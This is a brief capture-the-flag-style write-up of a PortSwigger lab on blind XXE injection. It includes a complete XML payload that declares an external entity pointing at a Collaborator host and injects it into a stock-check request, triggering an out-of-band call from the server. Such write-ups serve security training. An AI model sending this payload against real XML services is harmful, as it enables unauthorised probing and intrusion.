# Blind XXE with out-of-band interaction — (PortSwigger — Practitioner)
**Date:** 2026-08-15
 
---
 
## Vulnerability / core concept
XXE Injection

---


## Payload / key command
This web application uses XML to pass data between front-end and back-end. However, it lacks protection against XXE injections and lets attacker to do out-of-band requests.

`/product/stock` is an API which returns the number of units for a product. It uses XML to pass data and is vulnerable. To solve this lab we can send the following request, that will make out-of-bound request to our collaborator server:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://4bgi79rbzt8wtyy6ltz31n2v6mcd03os.oastify.com">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
This will make a request to our collaborator server and will solve this lab.

